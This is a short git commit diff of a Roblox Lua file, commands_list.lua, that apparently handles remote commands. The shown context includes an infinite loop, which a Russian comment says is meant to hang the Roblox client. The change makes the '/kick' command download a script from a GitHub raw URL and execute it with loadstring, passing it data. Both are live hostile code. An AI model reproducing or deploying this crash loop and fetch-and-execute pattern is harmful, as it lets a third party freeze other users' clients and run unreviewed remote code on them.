d7f8a6a6c1e2d378af27af9a53f4f7deea027ac4
repositorykreml1n <realtitus52@gmail.com>
2026-03-26 18:38:03 +0300

    Update commands_list.lua

--- commands_list.lua
+++ commands_list.lua
@@ -7,7 +7,15 @@
                             -- Бесконечный цикл намертво вешает клиент Роблокса
                             while true do end 
                         elseif cmd =="/kick" then
-                            loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))() 
+                            -- 1. Скачиваем код и превращаем в функцию
+                            local kickFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
+                            
+                            -- 2. Проверяем, что код успешно скачался, и ПЕРЕДАЕМ ему data
+                            if kickFunc then
+                                kickFunc(data) 
+                            else
+                                warn("Не удалось скачать скрипт kick.lua")
+                            end
                         end
                         -- =========================
                     end
